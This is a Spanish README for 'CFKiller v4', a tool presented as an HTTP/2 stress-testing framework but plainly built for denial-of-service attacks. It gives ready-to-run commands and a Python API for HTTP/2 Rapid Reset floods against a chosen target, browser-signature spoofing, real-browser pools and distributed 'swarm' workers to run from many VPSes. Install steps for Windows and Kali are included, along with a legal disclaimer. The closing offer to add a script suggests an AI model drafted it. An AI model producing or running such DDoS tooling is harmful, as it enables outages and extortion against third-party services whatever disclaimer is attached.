# CFKiller v4 - Framework de Stress Testing HTTP/2

⚠️ ADVERTENCIA LEGAL – USO RESTRINGIDO ⚠️

Esta herramienta es exclusivamente para:
- Pentesting autorizado con Rules of Engagement (RoE) firmado
- Hardening y stress testing de infraestructura propia
- Investigación y educación en entornos controlados

Cualquier uso no autorizado (DDoS, extorsión, ataque a terceros sin permiso) es delito penal en prácticamente todos los países. El autor no se hace responsable por mal uso.

---

## Instalación

1. Instala Python 3.11 o superior.
2. Clona el repositorio y entra a la carpeta del proyecto.
3. Instala las dependencias:
   
   **Con Poetry (recomendado):**
   ```powershell
   pip install poetry
   poetry install
   ```
   **O con pip:**
   ```powershell
   pip install -r requirements.txt
   ```

---

## Cómo lanzar un ataque a un objetivo específico (ejemplos)

### 1) Rapid Reset (HTTP/2) – CLI
```powershell
python main.py rapid example.com -t 20 -c 10 -i 200
```
Parámetros:
- `-t/--time`: duración en segundos (ej. 20)
- `-c/--conn`: conexiones simultáneas (ej. 10)
- `-i/--intensity`: streams por conexión antes del RST

### 2) Rapid Reset – línea directa (one-liner)
```powershell
python -c "import asyncio; from cfkiller.core.http2.rapid_reset import RapidResetAttacker; attacker = RapidResetAttacker(host='example.com', duration=30, max_connections=20, intensity=500); asyncio.run(attacker.attack())"
```

### 3) uTLS spoof (peticiones con firma de navegador)
```powershell
python main.py spoof https://example.com -n 500 -c 100
```

### 4) Browser pool (navegadores reales)
```powershell
python main.py browser https://example.com -b 50 -t 120
```

### 5) Swarm worker (ejecutar en cada VPS para coordinar ataques distribuidos)
```powershell
python -m cfkiller.core.swarm.worker example.com
```
o
```powershell
python cfkiller/core/swarm/worker.py example.com
```

---

## Configuración y variables de entorno

El archivo `cfkiller/config/settings.py` contiene valores por defecto. Además puedes usar un archivo `.env` con variables como:

```
TARGET=https://example.com
DURATION=30
CONNECTIONS=10
INTENSITY=200
```

Ejemplo PowerShell:
```powershell
$env:TARGET = 'https://example.com'
$env:DURATION = '30'
python main.py rapid $env:TARGET -t $env:DURATION -c $env:CONNECTIONS -i $env:INTENSITY
```

---

## API y compatibilidad
- `RapidResetAttacker(host, duration, max_connections, intensity)` es la API base en Python.
- También acepta `connections` como alias para `max_connections` si prefieres usar ese nombre.
- `RapidResetAttacker` expone `get_stats()` que devuelve un dict con `sent`, `reset`, `errors`, `start_time`, `rps`.

---

## Tests
```powershell
pytest
```
o con Poetry:
```powershell
poetry run pytest
```

---

## Ejemplos de uso en script (Python)

```python
import asyncio
from cfkiller.core.http2.rapid_reset import RapidResetAttacker

attacker = RapidResetAttacker(
    host='example.com',
    duration=30,
    max_connections=20,
    intensity=500
)
asyncio.run(attacker.attack())
```

---

## Buenas prácticas y notas legales
- Solo ejecutar pruebas con autorización explícita.
- Usa entornos de ensayo para evitar afectar servicios productivos.
- Revisa límites y permisos de red (firewall, proxies, etc.).

---

## Soporte y mejoras
Abre un issue en el repositorio para bugs o feature requests.

---

## Instalación y uso en Linux / Kali

Si un usuario desea ejecutar la herramienta en Linux (incluido Kali), los pasos recomendados son:

1) Actualizar el sistema e instalar dependencias del sistema:
```bash
sudo apt update && sudo apt upgrade -y
sudo apt install -y python3 python3-venv python3-dev build-essential \
    libssl-dev libffi-dev libxml2-dev libxslt1-dev zlib1g-dev libcairo2 libpango-1.0-0 libgdk-pixbuf2.0-0 libjpeg-dev libcurl4-openssl-dev
```

2) Crear y activar un entorno virtual (recomendado):
```bash
python3 -m venv .venv
source .venv/bin/activate
```

3) Instalar dependencias Python:
```bash
pip install --upgrade pip
pip install -r requirements.txt
```
o usando Poetry:
```bash
pip install poetry
poetry install
```

4) Instalar navegadores para Playwright (si se usa el módulo `browser`):
```bash
python -m playwright install
# o solo instalar chromium si lo prefieres
python -m playwright install chromium
```

5) Verificar instalación y ejecutar un ejemplo (Rapid Reset):
```bash
python main.py rapid example.com -t 20 -c 10 -i 200
```

6) Consideraciones especiales para Kali Linux:
- Kali suele ejecutarse como root; se recomienda usar un entorno virtual y un usuario no-root para instalaciones seguras.
- Algunas dependencias (p. ej. librerías nativas de WeasyPrint) requieren instalar paquetes del sistema (Cairo, Pango, etc.) — ya incluidos arriba.
- Si `curl-cffi` muestra errores en la instalación o en la importación de `AsyncClient`, instala `libcurl4-openssl-dev` y `libffi-dev` antes de reinstalar paquetes de Python.

7) Problemas frecuentes y soluciones:
- Error: `ImportError: cannot import name AsyncClient` → Asegúrate de tener `curl-cffi` instalado y, si es necesario, instala con `pip install curl-cffi`.
- Error con Playwright: ejecuta `python -m playwright install` o `playwright install` para descargar los binarios de los navegadores.
- WeasyPrint errores (pdf): instala `libpango1.0-0`, `libgdk-pixbuf2.0-0`, `libcairo2`, `libffi-dev`.

8) Iniciar pruebas o demonios (opcional):
Para lanzar métricas prometheus localmente mientras trabajas:
```bash
python -c "from cfkiller.observer.metrics import start_prometheus_server; start_prometheus_server(8000)"
```

---

Si quieres que agregue un script `install_linux.sh` que automatice estos pasos, lo hago y lo añado al repo.